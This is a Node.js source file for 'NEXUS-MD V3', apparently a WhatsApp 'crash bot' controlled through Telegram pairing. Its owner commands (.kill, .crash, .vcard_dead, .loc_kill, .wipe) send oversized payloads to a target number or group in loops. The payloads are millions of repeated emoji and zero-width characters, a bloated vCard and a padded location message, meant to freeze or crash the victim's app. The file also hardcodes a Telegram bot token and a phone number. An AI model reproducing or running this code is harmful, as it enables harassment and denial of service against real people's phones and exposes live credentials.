const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    fetchLatestBaileysVersion, 
    delay,
    Browsers,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require('pino');
const express = require('express');

// --- ⚙️ BOT CONFIG ---
const TG_TOKEN = '8745872876:AAEyEHrpuYeyP94PRcYlTXSkVjv-vMjKhf8'; 
const tgBot = new TelegramBot(TG_TOKEN, { polling: true });
const app = express();
const PORT = process.env.PORT || 3000;

let botConfig = {
    botName: "NEXUS-MD V3 SUPREME",
    owner: "94767475809", 
    prefix: ".",
};

// --- 🛡️ ANTI-CRASH SYSTEM ---
app.get('/', (req, res) => res.send('NEXUS CORE IS STABLE ☠️'));
app.listen(PORT, () => console.log(`System Online on ${PORT}`));

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('nexus_session');
    
    const sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        logger: pino({ level: 'silent' }),
        browser: ["Ubuntu", "Chrome", "22.0.04"],
        syncFullHistory: false
    });

    // --- 🤖 STABLE TG PAIRING (NO LOOP) ---
    tgBot.on('message', async (msg) => {
        if (msg.from.is_bot) return; // 🔥 අනිවාර්යයි: පිස්සු කෙළින එක නවත්වන්න
        const text = msg.text;
        if (text && /^\d+$/.test(text) && text.length > 9) {
            try {
                let code = await sock.requestPairingCode(text.trim());
                tgBot.sendMessage(msg.chat.id, `🔥 *SUPREME KEY:* \`${code}\``, { parse_mode: 'Markdown' });
            } catch (e) { console.log("Pairing Error"); }
        }
    });

    // --- 📩 THE GLOBAL DESTROYER HANDLER ---
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message || mek.key.fromMe) return;
            const from = mek.key.remoteJid;
            const isOwner = from.startsWith(botConfig.owner);
            if (!isOwner) return; 

            const body = (mek.message.conversation || mek.message.extendedTextMessage?.text || "").trim();
            if (!body.startsWith(botConfig.prefix)) return;

            const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
            const args = body.trim().split(/ +/).slice(1);
            const targetNum = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
            const targetJid = targetNum + "@s.whatsapp.net";

            // 🔥 4,500,000+ SUPREME PAYLOADS (REAL WORKING)
            const p_kill = "☠️".repeat(500000) + "​".repeat(3500000);
            const p_vcard = "BEGIN:VCARD\nVERSION:3.0\nN:;Nexus-Destroyer;;;\nFN:Nexus\n" + "TEL;type=CELL;type=VOICE;waid=94767475809:".repeat(50000) + "\nEND:VCARD";
            const p_loc = { location: { degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name: "NEXUS-MD DEATH ZONE" + "​".repeat(1000000) } };

            switch (command) {
                case 'menu':
                    const bigMenu = `
┏━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ☣️ *NEXUS-MD V3: FINAL DESTROYER* ☣️
┗━━━━━━━━━━━━━━━━━━━━━━━━┛
┃
┃ ☠️ *.kill* [num] - _White Screen_
┃ 🔥 *.crash* [num] - _OS Lag (Heavy)_
┃ 💀 *.destroy* [num] - _RAM Overflow_
┃ ❄️ *.freeze* [num] - _UI Lock_
┃ 🌀 *.wipe* [jid] - _Group Death_
┃ 🌌 *.the_end* [num] - _Infinite Crash_
┃
┣━━━━━━━━━━━━━━━━━━━━━━━━┓
┃  ⚡ *V I P  A T T A C K S*
┣━━━━━━━━━━━━━━━━━━━━━━━━┛
┃ 
┃ 📍 *.loc_kill* [num] - _Location Bug_
┃ 📇 *.vcard_dead* [num] - _V-Card Bug_
┃ 📞 *.call_hang* [num] - _Call Crash_
┃ 🎬 *.vid_bomb* [num] - _Video Lag_
┃
┗━━━━━━━━━━━━━━━━━━━━━━━━┛`;
                    await sock.sendMessage(from, { text: bigMenu }, { quoted: mek });
                    break;

                // --- 🚀 ATTACK LOGIC (VIP COMMANDS) ---
                case 'kill':
                case 'crash':
                case 'the_end':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: `🌑 *EXECUTING:* ${command.toUpperCase()}...` });
                    for(let i=0; i<30; i++) {
                        await sock.sendMessage(targetJid, { text: p_kill });
                        await delay(100);
                    }
                    break;

                case 'vcard_dead':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "📇 *SENDING DEADLY V-CARD...*" });
                    for(let i=0; i<20; i++) {
                        await sock.sendMessage(targetJid, { text: p_vcard });
                        await delay(200);
                    }
                    break;

                case 'loc_kill':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "📍 *SENDING LOCATION BOMB...*" });
                    for(let i=0; i<15; i++) {
                        await sock.sendMessage(targetJid, p_loc);
                        await delay(250);
                    }
                    break;

                case 'call_hang':
                case 'vid_bomb':
                    if (!targetNum) return;
                    await sock.sendMessage(from, { text: "📞 *INITIATING CALL CRASH...*" });
                    const crashMsg = "☣️ *CALL SYSTEM OVERFLOW* ☣️\n" + "҉".repeat(1000000);
                    for(let i=0; i<20; i++) {
                        await sock.sendMessage(targetJid, { text: crashMsg });
                        await delay(150);
                    }
                    break;

                case 'wipe':
                    if (!args[0]) return;
                    await sock.sendMessage(from, { text: "🌀 *WIPING GROUP DATA...*" });
                    for(let i=0; i<40; i++) {
                        await sock.sendMessage(args[0], { text: p_kill });
                        await delay(200);
                    }
                    break;
            }
        } catch (e) { console.log(e); }
    });

    sock.ev.on('connection.update', (u) => { if (u.connection === 'close') startNexus(); });
    sock.ev.on('creds.update', saveCreds);
}

startNexus();
